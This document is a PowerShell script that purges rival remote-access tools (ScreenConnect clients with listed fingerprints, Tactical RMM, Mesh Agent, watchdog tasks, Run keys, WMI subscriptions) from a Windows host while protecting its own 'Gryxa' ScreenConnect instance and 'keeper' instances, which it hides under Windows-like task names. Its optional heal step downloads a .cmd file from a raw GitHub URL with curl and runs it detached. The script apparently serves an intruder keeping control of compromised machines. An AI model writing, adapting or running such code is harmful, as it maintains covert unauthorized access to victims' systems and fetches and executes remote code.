# WINRTCS_ANTI 1.0 - destroy competing RMM/SCWatchdog/KeepTwo/pluxn/vexlm stacks.
# Gryxa-safe: NEVER msiexec /x shared ProductCode; NEVER touch Gryxa or sevrz keepers.
# Desired keep: Gryxa 36e506ff016b2151 + keepers 5f6010579852e507 / f861c8140d453427 + WinRTCS.
# Log: C:\Users\Public\winrtcs_anti.log
# Usage: -Heal to reinstall Gryxa ONLY if not RUNNING after purge.
param(
    [switch]$Heal
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$log = 'C:\Users\Public\winrtcs_anti.log'
$GryxaFp = '36e506ff016b2151'
$KeepFps = @('36e506ff016b2151', '5f6010579852e507', 'f861c8140d453427')
$HostileFps = @(
    '194b6f627c5bdf33',  # zytrx
    '857e707f243610e5',  # old zytrx
    '89a1ede2d1bd11dd',  # uvexr
    '3d23696c4a9e2141',  # pulsv / KeepTwo / pluxn
    '9dd7e861c862d175',  # vexlm
    '3a607f4eb8ca7215',  # vexlm
    'd4212f02794545b5'   # vexlm
)

function L([string]$m) {
    Add-Content -Path $log -Value ("[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -Encoding ASCII
}

function Test-IsKeeperFp([string]$fp) {
    return ($KeepFps -contains $fp.ToLower())
}

'=== WINRTCS_ANTI begin host=' + $env:COMPUTERNAME + ' heal=' + $Heal.IsPresent |
    Set-Content -Path $log -Encoding ASCII
L ('keep=' + ($KeepFps -join ','))
L ('hostile_fps=' + ($HostileFps -join ','))

# --- 1) Hostile services (named) -------------------------------------------------
L 'phase_services'
$hostileSvcs = @(
    'MSServices',
    'SCWatchdog',
    'SCWatchdogAgent',
    'scwd-svc',
    'tacticalrmm',
    'Mesh Agent'
) + @($HostileFps | ForEach-Object { "ScreenConnect Client ($_)" })
foreach ($svc in $hostileSvcs) {
    try {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s) {
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            sc.exe stop "$svc" 2>$null | Out-Null
            sc.exe delete "$svc" 2>$null | Out-Null
            L ("svc_deleted " + $svc)
        }
    } catch { L ("svc_err " + $svc) }
}

# --- 2) Hostile ScreenConnect FPs (folder/reg only — NO msiexec /x) --------------
L 'phase_hostile_sc_fps'
foreach ($fp in $HostileFps) {
    if (Test-IsKeeperFp $fp) { L ("skip_keeper_fp " + $fp); continue }
    $svcName = "ScreenConnect Client ($fp)"
    try {
        Stop-Service -Name $svcName -Force -ErrorAction SilentlyContinue
        sc.exe stop "$svcName" 2>$null | Out-Null
        sc.exe delete "$svcName" 2>$null | Out-Null
    } catch {}
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        $_.Path -and ($_.Path -match [regex]::Escape("ScreenConnect Client ($fp)"))
    } | ForEach-Object {
        L ("proc_kill_sc " + $_.Name + " pid=" + $_.ProcessId + " fp=" + $fp)
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles, $env:ProgramData)) {
        if (-not $base) { continue }
        $dir = Join-Path $base "ScreenConnect Client ($fp)"
        if (Test-Path -LiteralPath $dir) {
            cmd /c ("takeown /f `"$dir`" /r /d y") 2>$null | Out-Null
            cmd /c ("icacls `"$dir`" /grant Administrators:F /t /c /q") 2>$null | Out-Null
            Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
            L ("rmdir_sc " + $dir)
        }
    }
    foreach ($hive in @(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
            'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
        )) {
        Get-ChildItem $hive -ErrorAction SilentlyContinue | ForEach-Object {
            $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if ($props.DisplayName -and ($props.DisplayName -match [regex]::Escape($fp))) {
                # Never remove Gryxa/keeper uninstall keys
                if ($props.DisplayName -match '36e506ff016b2151|5f6010579852e507|f861c8140d453427') { return }
                Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                L ("reg_uninstall_del " + $props.DisplayName)
            }
        }
    }
    foreach ($sb in @('Minimal', 'Network')) {
        $safe = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\$sb\$svcName"
        if (Test-Path -LiteralPath $safe) {
            Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue
            L ("safeboot_del " + $svcName)
        }
    }
    $svcReg = "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName"
    if (Test-Path -LiteralPath $svcReg) {
        Remove-Item -LiteralPath $svcReg -Recurse -Force -ErrorAction SilentlyContinue
        L ("svc_reg_del " + $svcName)
    }
}

# --- 3) Scheduled tasks ---------------------------------------------------------
L 'phase_tasks'
$taskPat = (
    'SCWatchdog|SCWatchdog_Network|ScreenConnectWatchdog|SC_Health|SCCheck|' +
    'SCEmergencyCallback|SysMaintWatchdog|SCTemp_|SCW-|scwd-|' +
    'SC_Monitor_9dd7e861|SC_Startup_9dd7e861|SC_Logon_9dd7e861|SC_Hourly_9dd7e861|' +
    'SC_HealthCheck_9dd7e861|SC_ConnectivityMonitor_9dd7e861|' +
    'MSServices|vexlm|SCRepair|SCCleanup|KeepTwo|RemoveRest|' +
    'SCAgentMigration|RMMCleanup|SC-Migration|zytrx|uvexr|pulsv|pluxn|' +
    '194b6f627c5bdf33|857e707f243610e5|89a1ede2d1bd11dd|3d23696c4a9e2141|' +
    '9dd7e861c862d175|wucache|ETLParser|NetTraceParser|SystemHealthMonitor|BVT'
)
$raw = & schtasks.exe /Query /FO CSV /V 2>$null
if ($raw) {
    $csv = $raw | ConvertFrom-Csv
    foreach ($t in $csv) {
        $tn = [string]$t.TaskName
        if (-not $tn) { continue }
        if ($tn -match '\\Microsoft\\Windows\\WinRTCS|\\WinRTCS|WinRTCS') { continue }
        $acts = [string]$t.'Task To Run'
        if (-not $acts) { $acts = [string]$t.TaskToRun }
        # Never delete tasks that clearly run our keepers/Gryxa agent paths alone
        if ($acts -match 'winrtcs|WinRTCS|ProgramData\\WinRTCS') { continue }
        if (($tn -match $taskPat) -or ($acts -match $taskPat)) {
            & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
            L ("task_deleted " + $tn)
        }
    }
}
foreach ($tn in @(
        '\Microsoft\Windows\Maintenance\SCWatchdog',
        '\Microsoft\Windows\Maintenance\SCWatchdog_Network',
        'SCWatchdog', 'SCWatchdog_Network', 'ScreenConnectWatchdog',
        'SC_Health', 'SCCheck', 'SCEmergencyCallback', 'SysMaintWatchdog',
        'SC_Monitor_9dd7e861c862d175', 'SC_Startup_9dd7e861c862d175',
        'SC_Logon_9dd7e861c862d175', 'SC_Hourly_9dd7e861c862d175',
        'SC_HealthCheck_9dd7e861c862d175', 'SC_ConnectivityMonitor_9dd7e861c862d175',
        'SC-Migration-Orchestrator', 'WinRTCSVEXLM'
    )) {
    & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
}

# --- 4) Run keys ----------------------------------------------------------------
L 'phase_runkeys'
foreach ($rk in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    )) {
    $p = Get-ItemProperty -Path $rk -ErrorAction SilentlyContinue
    if (-not $p) { continue }
    foreach ($prop in $p.PSObject.Properties) {
        $n = [string]$prop.Name
        $v = [string]$prop.Value
        if ($n -match '^(PSPath|PSParentPath|PSChildName|PSDrive|PSProvider)$') { continue }
        if ($v -match 'winrtcs|WinRTCS|ProgramData\\WinRTCS') { continue }
        if ($n -match 'SCWatchdog|scwd|ScreenConnectMonitor|SC_Monitor|MSServices|vexlm|RMMCleanup|SCAgentMigration' -or
            $v -match 'SCWatchdog|SCRepair|SC_Monitor_9dd7e861|vexlm\.com|MSServices|zytrx|uvexr|pulsv|pluxn|SCCleanup|KeepTwo|RMMCleanup|SCAgentMigration|tacticalrmm') {
            Remove-ItemProperty -Path $rk -Name $n -Force -ErrorAction SilentlyContinue
            L ("runkey_deleted " + $n)
        }
    }
}

# --- 5) WMI persistent event subscriptions --------------------------------------
L 'phase_wmi'
$ns = 'root\subscription'
$pat = (
    'SCWatchdog|SystemHealthMonitor|BVTConsumer|BVTTrigger|BVTFilter|WucacheWatchdog|KernCap|' +
    'SCCleanup|KeepTwo|RemoveRest|SC_Monitor_Filter|SC_Monitor_Consumer|SC_Monitor|' +
    'vexlm|SCRepair|MSServices|9dd7e861c862d175|zytrx|uvexr|pulsv|pluxn|' +
    '194b6f627c5bdf33|857e707f243610e5|89a1ede2d1bd11dd|3d23696c4a9e2141|' +
    'SCEmergency|SysMaintWatchdog|scwd|wucache|ETLParser|NetTraceParser'
)
for ($r = 1; $r -le 6; $r++) {
    $n = 0
    Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | ForEach-Object {
        $b = [string]$_.Filter + ' ' + [string]$_.Consumer
        if ($b -match $pat) {
            try { $_.Delete(); L ('del_bind ' + ($b -replace '\s+', ' ').Substring(0, [Math]::Min(160, ($b -replace '\s+', ' ').Length))); $n++ } catch {}
        }
    }
    Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | ForEach-Object {
        $hit = ($_.Name -match $pat) -or ($_.CommandLineTemplate -and $_.CommandLineTemplate -match $pat)
        if ($hit) {
            $nm = $_.Name
            Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
                Where-Object { $_.Consumer -match [regex]::Escape($nm) } |
                ForEach-Object { try { $_.Delete() } catch {} }
            try { $_.Delete(); L ('del_cons ' + $nm); $n++ } catch {}
        }
    }
    Get-WmiObject -Namespace $ns -Class __EventFilter -ErrorAction SilentlyContinue | ForEach-Object {
        $hit = ($_.Name -match $pat) -or ($_.Query -and $_.Query -match $pat)
        if ($hit) {
            $nm = $_.Name
            Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
                Where-Object { $_.Filter -match [regex]::Escape($nm) } |
                ForEach-Object { try { $_.Delete() } catch {} }
            try { $_.Delete(); L ('del_filt ' + $nm); $n++ } catch {}
        }
    }
    L ("wmi_round=$r killed=$n")
    if ($n -eq 0) { break }
}

# --- 6) Hostile processes -------------------------------------------------------
L 'phase_procs'
$procPat = (
    'SCWatchdog|SCRepair|SC_Monitor_9dd7e861|MSServices_Wrapper|MSServices\.ps1|' +
    'vexlm\.com|RMM-AutoPurge|SC-KeepTwo|KeepTwo-RemoveRest|SCCleanup|' +
    'RMMCleanup|SCAgentMigration|zytrx\.com|uvexr\.com|pulsv\.com|pluxn\.com|' +
    'tacticalrmm|tacticalagent|scwd-heartbeat|scwd-recovery|watchdog-resurrect'
)
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
    $_.CommandLine -and ($_.CommandLine -match $procPat) -and
    ($_.CommandLine -notmatch 'winrtcs|WinRTCS|winrtcs_anti') -and
    ($_.ProcessId -ne $PID) -and
    # never kill Gryxa/keeper binaries by path
    (-not ($_.Path -and ($_.Path -match '36e506ff016b2151|5f6010579852e507|f861c8140d453427')))
} | ForEach-Object {
    L ("proc_kill " + $_.Name + " pid=" + $_.ProcessId)
    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}

# --- 7) Files / dirs / reg keys -----------------------------------------------
L 'phase_files'
$paths = @(
    'C:\ProgramData\SCWatchdog',
    'C:\Program Files\SCWatchdog',
    'C:\Program Files (x86)\SCWatchdog',
    'C:\ProgramData\YourMSP',
    'C:\ProgramData\SCCleanup',
    'C:\ProgramData\SCRepair',
    'C:\ProgramData\SCAgentMigration',
    'C:\ProgramData\RMMCleanup',
    'C:\ProgramData\TacticalRMM',
    'C:\Program Files\TacticalAgent',
    'C:\Program Files\Mesh Agent',
    'C:\Security',
    'C:\Windows\System32\CodeIntegrity\SCWatchdog.p7b',
    'C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\SC_Startup.bat',
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SC_Monitor.vbs',
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MSServices.ps1',
    'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SC_Monitor_9dd7e861c862d175.ps1',
    'C:\Windows\Temp\MSServices.ps1',
    'C:\Windows\Temp\SC_Monitor_9dd7e861c862d175.ps1',
    'C:\Users\Public\SC-KeepTwo-RemoveRest.ps1',
    'C:\Windows\Temp\SC-KeepTwo-RemoveRest.ps1',
    'C:\ProgramData\Microsoft\Diagnosis\ETLParser.ps1',
    'C:\ProgramData\Microsoft\NetTrace\NetTraceParser.ps1',
    'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    'C:\ProgramData\Microsoft\NetTrace',
    'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache'
)
foreach ($u in Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue) {
    $paths += (Join-Path $u.FullName 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MSServices.ps1')
    $paths += (Join-Path $u.FullName 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SC_Monitor.vbs')
    $paths += (Join-Path $u.FullName 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SC_Monitor_9dd7e861c862d175.ps1')
}
foreach ($p in $paths) {
    if (Test-Path -LiteralPath $p) {
        try {
            cmd /c ("attrib -H -S -R `"$p`" /S /D") 2>$null | Out-Null
            Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue
            L ("removed " + $p)
        } catch { L ("rm_fail " + $p) }
    }
}
# Task XML leftovers under ScreenConnect\Watchdog*
Get-ChildItem 'C:\Windows\System32\Tasks\ScreenConnect' -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match 'Watchdog|SCWatchdog|scwd' } |
    ForEach-Object {
        Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
        L ("taskxml_del " + $_.FullName)
    }
Get-ChildItem 'C:\Windows\System32\Tasks\Microsoft\Windows\ScreenConnect' -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match 'Watchdog|SCWatchdog|scwd' } |
    ForEach-Object {
        Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
        L ("taskxml_del " + $_.FullName)
    }

foreach ($rk in @('HKLM:\SOFTWARE\SCWatchdog', 'HKLM:\SOFTWARE\WOW6432Node\SCWatchdog')) {
    if (Test-Path -LiteralPath $rk) {
        Remove-Item -LiteralPath $rk -Recurse -Force -ErrorAction SilentlyContinue
        L ("reg_del " + $rk)
    }
}

# --- 8) Tactical / Mesh uninstall leftovers -------------------------------------
L 'phase_tactical'
foreach ($svc in @('tacticalrmm', 'Mesh Agent', 'tacticalagent')) {
    sc.exe stop $svc 2>$null | Out-Null
    sc.exe delete $svc 2>$null | Out-Null
}
$tacUninst = 'C:\Program Files\TacticalAgent\unins000.exe'
if (Test-Path -LiteralPath $tacUninst) {
    Start-Process -FilePath $tacUninst -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES', '/NORESTART' -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
    L 'tactical_unins_ran'
}

# --- 9) Gryxa safety check + optional heal --------------------------------------
L 'phase_gryxa_check'
$gsvc = "ScreenConnect Client ($GryxaFp)"
$st = $null
try { $st = (Get-Service -Name $gsvc -ErrorAction SilentlyContinue).Status } catch {}
L ("gryxa_status=" + $(if ($st) { $st.ToString() } else { 'MISSING' }))

# Soft-start if present but stopped (no /x)
if ($st -and $st -ne 'Running') {
    try {
        Set-Service -Name $gsvc -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name $gsvc -ErrorAction SilentlyContinue
        sc.exe start "$gsvc" 2>$null | Out-Null
        Start-Sleep -Seconds 8
        $st = (Get-Service -Name $gsvc -ErrorAction SilentlyContinue).Status
        L ("gryxa_softstart=" + $(if ($st) { $st.ToString() } else { 'MISSING' }))
    } catch { L 'gryxa_softstart_fail' }
}

$needHeal = $Heal -and ((-not $st) -or ($st.ToString() -ne 'Running'))
if ($needHeal) {
    L 'heal_needed_fetch_r3'
    $recover = 'C:\Users\Public\gryxa_recover.cmd'
    try {
        & curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 60 -o $recover `
            'https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd' 2>$null
    } catch {}
    if (Test-Path -LiteralPath $recover) {
        L 'heal_calling_r3'
        & cmd.exe /c "`"$recover`" --detached"
        L 'heal_r3_queued'
    } else {
        L 'heal_FAIL_no_recover_cmd'
    }
} else {
    L 'heal_skipped_gryxa_ok_or_no_heal_flag'
}

L 'WINRTCS_ANTI_DONE'
Write-Output 'WINRTCS_ANTI_DONE'
